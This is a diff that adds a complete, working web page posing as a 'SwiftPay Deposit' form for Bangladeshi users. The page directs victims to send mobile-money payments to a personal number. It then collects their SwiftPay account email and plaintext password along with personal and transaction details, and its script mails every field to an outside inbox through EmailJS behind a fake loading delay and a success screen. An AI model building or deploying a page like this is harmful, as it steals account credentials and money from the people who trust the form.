@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SwiftPay Deposit</title>
+  
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <style>
+    :root {
+      --primary: #007bff;
+      --primary-dark: #0056b3;
+      --secondary: #6c757d;
+      --success: #28a745;
+      --light: #f8f9fa;
+      --dark: #343a40;
+      --border-radius: 8px;
+      --box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      --transition: all 0.3s ease;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #f2f6fc 0%, #e9ecef 100%);
+      color: var(--dark);
+      line-height: 1.6;
+      min-height: 100vh;
+      padding-bottom: 20px;
+    }
+
+    header {
+      background: linear-gradient(to right, var(--primary), var(--primary-dark));
+      color: white;
+      padding: 20px;
+      text-align: center;
+      position: relative;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+
+    .logo h1 {
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    .bd-badge {
+      background: rgba(255, 255, 255, 0.2);
+      padding: 8px 15px;
+      border-radius: 30px;
+      font-size: 14px;
+      font-weight: 500;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 5px;
+      border: 1px solid rgba(255, 255, 255, 0.3);
+    }
+
+    .menu-container {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+    }
+
+    .menu {
+      cursor: pointer;
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,255,255,0.2);
+      padding: 10px 18px;
+      border-radius: 30px;
+      transition: var(--transition);
+      font-weight: 500;
+    }
+
+    .menu:hover {
+      background: rgba(255,255,255,0.3);
+      transform: translateY(-2px);
+    }
+
+    .guide {
+      display: none;
+      padding: 25px;
+      background: white;
+      border-top: 3px solid var(--primary);
+      max-width: 600px;
+      margin: 20px auto;
+      border-radius: var(--border-radius);
+      box-shadow: var(--box-shadow);
+    }
+
+    .guide h3 {
+      color: var(--primary);
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .guide ol {
+      padding-left: 20px;
+    }
+
+    .guide li {
+      margin-bottom: 10px;
+      padding-left: 5px;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .form-container {
+      background: white;
+      padding: 30px;
+      border-radius: var(--border-radius);
+      box-shadow: var(--box-shadow);
+      width: 100%;
+      max-width: 500px;
+      margin: 20px auto;
+    }
+
+    .form-container h2 {
+      text-align: center;
+      color: var(--primary);
+      margin-bottom: 25px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      color: var(--dark);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .input-with-icon {
+      position: relative;
+    }
+
+    .input-with-icon i {
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--secondary);
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px 15px 12px 45px;
+      border-radius: var(--border-radius);
+      border: 1px solid #ddd;
+      font-size: 16px;
+      transition: var(--transition);
+    }
+
+    input:focus, select:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(0,123,255,0.1);
+    }
+
+    .section-title {
+      color: var(--primary);
+      margin: 25px 0 15px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid #eee;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border-radius: var(--border-radius);
+      border: none;
+      background: linear-gradient(to right, var(--primary), var(--primary-dark));
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    button:hover {
+      background: linear-gradient(to right, var(--primary-dark), #004085);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    /* Enhanced Loading Animation */
+    .loading {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 30px;
+      background: white;
+      border-radius: var(--border-radius);
+      box-shadow: var(--box-shadow);
+      max-width: 500px;
+      margin: 30px auto;
+    }
+
+    .payment-animation {
+      position: relative;
+      width: 200px;
+      height: 120px;
+      margin-bottom: 25px;
+    }
+
+    .sending-path {
+      position: absolute;
+      top: 50%;
+      left: 0;
+      width: 100%;
+      height: 4px;
+      background: #e9ecef;
+      border-radius: 2px;
+      transform: translateY(-50%);
+    }
+
+    .sending-path::before,
+    .sending-path::after {
+      content: '';
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      top: -8px;
+    }
+
+    .sending-path::before {
+      background: #f72585;
+      left: 0;
+      box-shadow: 0 0 10px rgba(247, 37, 133, 0.5);
+    }
+
+    .sending-path::after {
+      background: #4CC9F0;
+      right: 0;
+      box-shadow: 0 0 10px rgba(76, 201, 240, 0.5);
+    }
+
+    .coin {
+      position: absolute;
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, #fdbb2d, #f9d423);
+      border-radius: 50%;
+      top: 50%;
+      left: 10%;
+      transform: translateY(-50%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 18px;
+      color: #333;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+      animation: coin-move 2s infinite ease-in-out;
+    }
+
+    @keyframes coin-move {
+      0% {
+        left: 10%;
+        transform: translateY(-50%) scale(1) rotate(0deg);
+      }
+      50% {
+        left: 90%;
+        transform: translateY(-50%) scale(1.1) rotate(180deg);
+      }
+      100% {
+        left: 10%;
+        transform: translateY(-50%) scale(1) rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .loading p {
+      font-size: 18px;
+      color: var(--primary);
+      font-weight: 500;
+    }
+
+    .dots {
+      display: flex;
+      gap: 5px;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--primary);
+      animation: dot-pulse 1.5s infinite ease-in-out;
+    }
+
+    .dot:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .dot:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes dot-pulse {
+      0%, 100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+      50% {
+        transform: scale(1.5);
+        opacity: 0.7;
+      }
+    }
+
+    /* Success Message */
+    .success-message {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 30px;
+      background: white;
+      border-radius: var(--border-radius);
+      box-shadow: var(--box-shadow);
+      max-width: 500px;
+      margin: 30px auto;
+      text-align: center;
+    }
+
+    .success-message i {
+      font-size: 60px;
+      color: var(--success);
+      margin-bottom: 20px;
+    }
+
+    .success-message h3 {
+      color: var(--success);
+      margin-bottom: 15px;
+    }
+
+    .success-message p {
+      margin-bottom: 20px;
+      color: var(--secondary);
+    }
+
+    .success-message button {
+      max-width: 200px;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 576px) {
+      .form-container {
+        padding: 20px;
+      }
+      
+      header {
+        padding: 15px;
+      }
+      
+      .menu-container {
+        position: static;
+        margin-top: 15px;
+      }
+      
+      .menu {
+        justify-content: center;
+      }
+      
+      .logo h1 {
+        font-size: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <h1>SwiftPay Deposit</h1>
+      <div class="bd-badge">
+        <i class="fas fa-user-shield"></i>
+        Method Only For Bangladeshi Users 
+      </div>
+    </div>
+    <div class="menu-container">
+      <div class="menu" onclick="toggleGuide()">
+        <i class="fas fa-info-circle"></i>
+        How To Deposit
+      </div>
+    </div>
+  </header>
+
+  <div class="guide" id="guide">
+    <h3><i class="fas fa-graduation-cap"></i> Step by Step Deposit Guide</h3>
+    <ol>
+      <li>Select your Payment Method (Bkash / Nagad / Rocket).</li>
+      <li>Send the required Amount to our official number. <strong>+8801610709657</strong></li>
+      <li>Copy the Transaction ID (Trnx ID).</li>
+      <li>Open Your SwiftPay and Copy Your Reception ID
+      </li>
+      <li>Fill up this form with correct details.</li>
+      <li>Tap <b>Send</b> and wait for confirmation.</li>
+    </ol>
+  </div>
+
+  <div class="container">
+    <div class="form-container" id="formContainer">
+      <h2><i class="fas fa-paper-plane"></i> Deposit Request</h2>
+
+      <form id="depositForm">
+        <div class="form-group">
+          <label for="full_name"><i class="fas fa-user"></i> Full Name</label>
+          <div class="input-with-icon">
+            <i class="fas fa-user"></i>
+            <input type="text" id="full_name" placeholder="Enter your full name" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="contact_number"><i class="fas fa-phone"></i> Contact Number</label>
+          <div class="input-with-icon">
+            <i class="fas fa-phone"></i>
+            <input type="text" id="contact_number" placeholder="Enter your contact number" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="email"><i class="fas fa-envelope"></i> Email</label>
+          <div class="input-with-icon">
+            <i class="fas fa-envelope"></i>
+            <input type="email" id="email" placeholder="Enter your email address" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="method"><i class="fas fa-credit-card"></i> Payment Method</label>
+          <div class="input-with-icon">
+            <i class="fas fa-credit-card"></i>
+            <select id="method" required>
+              <option value="" disabled selected>Select Payment Method</option>
+              <option value="Bkash">Bkash</option>
+              <option value="Nagad">Nagad</option>
+              <option value="Rocket">Rocket</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="amount"><i class="fas fa-money-bill"></i> Amount</label>
+          <div class="input-with-icon">
+            <i class="fas fa-money-bill"></i>
+            <input type="number" id="amount" placeholder="Enter deposit amount" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="tranx_id"><i class="fas fa-receipt"></i> Transaction ID</label>
+          <div class="input-with-icon">
+            <i class="fas fa-receipt"></i>
+            <input type="text" id="tranx_id" placeholder="Enter transaction ID" required>
+          </div>
+        </div>
+
+        <h3 class="section-title"><i class="fas fa-user-circle"></i> Your SwiftPay Details</h3>
+
+        <div class="form-group">
+          <label for="account_email"><i class="fas fa-at"></i> Account Email</label>
+          <div class="input-with-icon">
+            <i class="fas fa-at"></i>
+            <input type="email" id="account_email" placeholder="Enter your SwiftPay account email" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="account_password"><i class="fas fa-lock"></i> Account Password</label>
+          <div class="input-with-icon">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="account_password" placeholder="Enter your SwiftPay account password" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="reception_id"><i class="fas fa-id-card"></i> Reception ID</label>
+          <div class="input-with-icon">
+            <i class="fas fa-id-card"></i>
+            <input type="text" id="reception_id" placeholder="Enter reception ID" required>
+          </div>
+        </div>
+
+        <button type="submit" id="submitBtn">
+          <i class="fas fa-paper-plane"></i> Send Deposit Request
+        </button>
+      </form>
+    </div>
+
+    <!-- Enhanced Loading Animation -->
+    <div class="loading" id="loading">
+      <div class="payment-animation">
+        <div class="sending-path"></div>
+        <div class="coin">
+          <i class="fas fa-coins"></i>
+        </div>
+      </div>
+      <div class="loading-text">
+        <p>Processing your deposit request</p>
+        <div class="dots">
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Success Message -->
+    <div class="success-message" id="successMessage">
+      <i class="fas fa-check-circle"></i>
+      <h3>Deposit Request Sent Successfully!</h3>
+      <p>Your deposit request has been received. We'll process it shortly and send a confirmation to your email.</p>
+      <button onclick="resetForm()">
+        <i class="fas fa-plus"></i> New Deposit
+      </button>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    // Initialize EmailJS
+    (function(){
+      emailjs.init({
+        publicKey: "LPemNHMA6-56qd-fR"
+      });
+    })();
+
+    // Toggle guide visibility
+    function toggleGuide() {
+      const guide = document.getElementById('guide');
+      guide.style.display = guide.style.display === 'block' ? 'none' : 'block';
+    }
+
+    // Show loading animation
+    function showLoading() {
+      document.getElementById('formContainer').style.display = 'none';
+      document.getElementById('loading').style.display = 'flex';
+    }
+
+    // Hide loading animation
+    function hideLoading() {
+      document.getElementById('loading').style.display = 'none';
+    }
+
+    // Show success message
+    function showSuccess() {
+      document.getElementById('successMessage').style.display = 'flex';
+    }
+
+    // Reset form and show form again
+    function resetForm() {
+      document.getElementById('depositForm').reset();
+      document.getElementById('successMessage').style.display = 'none';
+      document.getElementById('formContainer').style.display = 'block';
+    }
+
+    // Send email function
+    async function sendMail(e) {
+      e.preventDefault();
+      
+      // Show loading animation
+      showLoading();
+      
+      const params = {
+        full_name: document.getElementById("full_name").value,
+        contact_number: document.getElementById("contact_number").value,
+        email: document.getElementById("email").value,
+        method: document.getElementById("method").value,
+        amount: document.getElementById("amount").value,
+        tranx_id: document.getElementById("tranx_id").value,
+        account_email: document.getElementById("account_email").value,
+        account_password: document.getElementById("account_password").value,
+        reception_id: document.getElementById("reception_id").value
+      };
+
+      try {
+        // Simulate API call delay for better UX
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        const res = await emailjs.send("service_fa9fwpo", "template_edyp8ek", params);
+        
+        // Hide loading and show success
+        hideLoading();
+        showSuccess();
+        
+      } catch (err) {
+        hideLoading();
+        document.getElementById('formContainer').style.display = 'block';
+        alert("Failed to send deposit request. Please try again.");
+        console.error("EmailJS Error:", err);
+      }
+    }
+
+    // Attach event listener to form
+    document.getElementById('depositForm').addEventListener('submit', sendMail);
+  </script>
+</body>
+</html>
